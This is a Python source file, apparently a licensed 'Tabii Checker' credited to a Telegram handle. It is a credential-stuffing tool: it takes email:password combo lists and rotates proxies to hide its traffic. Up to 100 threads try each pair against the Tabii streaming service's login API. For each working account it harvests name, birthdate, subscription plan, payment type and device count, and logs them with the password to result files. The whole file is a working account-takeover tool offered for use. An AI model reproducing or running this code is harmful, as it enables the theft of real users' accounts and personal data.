from cgauth_module import CGAuth
import httpx, threading, re, os
from datetime import datetime
from queue import Queue
from colorama import Fore, init

init(autoreset=True)

# ------------------- Lisans Doğrulama -------------------
print("🔐 Lisans doğrulaması başlatılıyor...")
license_key = input("Lisans anahtarınızı girin: ").strip()
try:
    hwid = CGAuth.get_hwid()
except Exception:
    hwid = ""

auth_result = CGAuth.auth_license(license_key, hwid)

# Eğer API hata döndürdü se basit bir hata söz konusu olabilir ("success": False veya "error" alanı)
if (isinstance(auth_result, dict) and (auth_result.get("success") is False or auth_result.get("error"))):
    print(f"❌ Lisans doğrulama başarısız: {auth_result.get('error', 'Bilinmeyen hata')}")
    input("Program kapatılacak, devam etmek için Enter'a basın...")
    exit()

# Bazı durumlarda auth_result API'den doğru bilgi içeren dict olarak dönebilir.
print("✅ Lisans doğrulama başarılı!\n")
try:
    user_display = auth_result.get('username') or auth_result.get('user') or auth_result.get('key')
    expiry = auth_result.get('expiry') or auth_result.get('expire') or auth_result.get('expireDate')
    if user_display:
        print(f"Kullanıcı: {user_display}")
    if expiry:
        print(f"Lisans süre’si: {expiry}")
    print("")
except Exception:
    pass

# ------------------- Program Başlatma -------------------

ascii_art = r"""
████████╗ █████╗ ██████╗ ██╗██╗     ██████╗██╗  ██╗███████╗ ██████╗██╗  ██╗███████╗██████╗ 
╚══██╔══╝██╔══██╗██╔══██╗██║██║    ██╔════╝██║  ██║██╔════╝██╔════╝██║ ██╔╝██╔════╝██╔══██╗
   ██║   ███████║██████╔╝██║██║    ██║     ███████║█████╗  ██║     █████╔╝ █████╗  ██████╔╝
   ██║   ██╔══██║██╔══██╗██║██║    ██║     ██╔══██║██╔══╝  ██║     ██╔═██╗ ██╔══╝  ██╔══██╗
   ██║   ██║  ██║██████╔╝██║██║    ╚██████╗██║  ██║███████╗╚██████╗██║  ██╗███████╗██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚═════╝ ╚═╝╚═╝     ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
"""
print(Fore.CYAN + ascii_art.center(80))
print(Fore.MAGENTA + "Tabii Checker • yunuswalsh".center(80))
print(Fore.YELLOW + "• Telegram: https://t.me/yunuswalsh".center(80) + "\n")

q = Queue()
lock = threading.Lock()
hits = fails = trials = 0
use_proxies = False
proxies = []

timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
success_file = f"SUCCESS_{timestamp}.txt"
trial_file = f"TRIAL_{timestamp}.txt"

def load_file(prompt):
    path = input(prompt).strip().strip('"')
    with open(path, encoding="utf-8", errors="ignore") as f:
        return [line.rstrip("\n") for line in f if line.strip()]

combos = load_file("Combo Dosya Yolunu giriniz: ")
print(f"[+] Loaded {len(combos)} combos")

if input("Use Proxy? (Y/N): ").lower().startswith("y"):
    use_proxies = True
    proxies = load_file("Proxy Dosya Yolunu girini: ")
    print(f"[+] Loaded {len(proxies)} proxies")

threads = input("Threads (default 30, max 100): ").strip()
threads = int(threads) if threads.isdigit() else 30
threads = min(max(1, threads), 100)

def parse_proxy(p):
    if p.count(":") == 1:
        return {"http://": f"http://{p}", "https://": f"http://{p}"}
    if p.count(":") == 3:
        ip, port, user, pw = p.split(":")
        return {"http://": f"http://{user}:{pw}@{ip}:{port}", "https://": f"http://{user}:{pw}@{ip}:{port}"}
    if "@" in p:
        return {"http://": f"http://{p}", "https://": f"http://{p}"}
    return None

def save_result(filename, line):
    if not os.path.exists("Results"):
        os.makedirs("Results")
    with open(os.path.join("Results", filename), "a", encoding="utf-8") as f:
        f.write(line + "\n")

def worker():
    global hits, fails, trials
    while not q.empty():
        combo = q.get()
        try:
            email, password = combo.split(":", 1)
        except:
            q.task_done()
            continue

        proxy = None
        if use_proxies and proxies:
            proxy = parse_proxy(proxies[hash(combo) % len(proxies)])

        try:
            with httpx.Client(proxies=proxy, timeout=15) as client:
                base_headers = {
                    "Host": "eu1.tabii.com",
                    "Connection": "keep-alive",
                    "Device-Network": "4g",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "Device-Type": "WEBDesktop",
                    "sec-ch-ua": "\"Chromium\";v=\"140\", \"Not=A?Brand\";v=\"24\", \"Google Chrome\";v=\"140\"",
                    "Device-Connection-Type": "Unknown",
                    "Device-Resolution": "2560x1440",
                    "sec-ch-ua-mobile": "?0",
                    "App-Version": "1.5.4",
                    "X-Country-Code": "MU",
                    "Device-Id": "1756903608571_154084",
                    "Accept": "application/json, text/plain, */*",
                    "Device-Model": "Windows NT 10.0 - Chrome",
                    "Platform": "Web",
                    "Device-Brand": "Windows",
                    "Device-Timezone": "Indian/Mauritius",
                    "Accept-Language": "tr",
                    "Device-OS-Version": "NT 10.0",
                    "Device-Orientation": "Landscape",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
                    "DNT": "1",
                    "Device-Language": "en-US",
                    "Device-Name": "Windows NT 10.0 - Chrome",
                    "Device-OS-Name": "Windows",
                    "Origin": "https://www.tabii.com",
                    "Sec-Fetch-Site": "same-site",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Dest": "empty",
                    "Referer": "https://www.tabii.com/",
                    "Accept-Encoding": "gzip, deflate"
                }

                headers_post = base_headers.copy()
                headers_post["Content-Type"] = "application/json;charset=UTF-8"

                payload = {"email": email, "password": password, "remember": False}
                r = client.post("https://eu1.tabii.com/apigateway/auth/v2/login", headers=headers_post, json=payload)

                if any(k in r.text for k in ["countryRestriction", "loginError", "Your country is not supported", "Lütfen e-posta adresi", "400", "403"]):
                    with lock:
                        fails += 1
                        print(Fore.RED + f"[FAIL] {email}:{password}")
                elif "{\"accessToken\":\"" in r.text:
                    data = r.json()
                    tk = data.get("accessToken")

                    headers_get = base_headers.copy()
                    headers_get["Content-Type"] = "application/x-www-form-urlencoded"
                    headers_get["Authorization"] = f"Bearer {tk}"

                    r2 = client.get("https://eu1.tabii.com/apigateway/auth/v2/me", headers=headers_get)
                    info = r2.text

                    birthdate = re.search(r'"birthdate":"(.*?)"', info)
                    email_verified = re.search(r'"emailVerified":(true|false)', info)
                    name = re.search(r'"name":"(.*?)"', info)
                    cur = re.search(r'"currencyCode":"(.*?)"', info)
                    is_free_trial = re.search(r'"isFreeTrial":(true|false)', info)
                    category = re.search(r'"category":"(.*?)"', info)
                    plan = re.search(r'"title":"(.*?)"', info)
                    plan_status = re.search(r'"status":"(.*?)"', info)
                    plan_price = re.search(r'"planPrice":"(.*?)"', info)
                    payment_type = re.search(r'"paymentType":"(.*?)"', info)
                    expiry = re.search(r'"expireDate":"(.*?)T', info)
                    country = re.search(r'"subscriptionCountryCode":"(.*?)"', info)

                    video_map = {"SVOD1": "Mobile", "SVOD2": "SD", "SVOD3": "HD", "SVOD4": "4K/UHD"}
                    video_quality = video_map.get(category.group(1), "N/A") if category else "N/A"

                    days_left = "N/A"
                    if expiry:
                        try:
                            dt = datetime.strptime(expiry.group(1), "%Y-%m-%d")
                            days_left = (dt - datetime.utcnow()).days
                        except:
                            pass

                    r3 = client.get("https://eu1.tabii.com/apigateway/devices/v1/", headers=headers_get)
                    dev_count = re.search(r'"count":(\d+)', r3.text)
                    devices = dev_count.group(1) if dev_count else "N/A"

                    captures = [
                        f"BirthDate={birthdate.group(1) if birthdate else 'N/A'}",
                        f"emailVerified={email_verified.group(1) if email_verified else 'N/A'}",
                        f"Name={name.group(1) if name else 'N/A'}",
                        f"isFreeTrial={is_free_trial.group(1) if is_free_trial else 'N/A'}",
                        f"videoQuality={video_quality}",
                        f"Plan={plan.group(1) if plan else 'N/A'}",
                        f"Plan Status={plan_status.group(1) if plan_status else 'N/A'}",
                        f"planPrice={(plan_price.group(1) + ' ' + cur.group(1)) if plan_price and cur else (plan_price.group(1) if plan_price else 'N/A')}",
                        f"paymentType={payment_type.group(1) if payment_type else 'N/A'}",
                        f"expireDate={expiry.group(1) if expiry else 'N/A'}",
                        f"Days Left={days_left}",
                        f"Country={country.group(1) if country else 'N/A'}",
                        f"Total Connected Devices={devices}",
                        f"Author=🔥 @yunuswalsh 🔥"
                    ]
                    capture_line = " | ".join(captures)

                    with lock:
                        if '\"isFreeTrial\":true' in info:
                            trials += 1
                            line = f"[TRIAL] {email}:{password} | {capture_line}"
                            print(Fore.YELLOW + line)
                            save_result(trial_file, line)
                        else:
                            hits += 1
                            line = f"[SUCCESS] {email}:{password} | {capture_line}"
                            print(Fore.GREEN + line)
                            save_result(success_file, line)
                else:
                    with lock:
                        fails += 1
                        print(Fore.RED + f"[FAIL] {email}:{password}")
        except Exception as e:
            with lock:
                fails += 1
                print(Fore.RED + f"[ERROR] {email}:{password} -> {e}")
        q.task_done()

for c in combos:
    q.put(c)

for _ in range(threads):
    threading.Thread(target=worker, daemon=True).start()

q.join()

print(Fore.CYAN + f"\nDone! Hits={hits} | Trials={trials} | Fails={fails}")
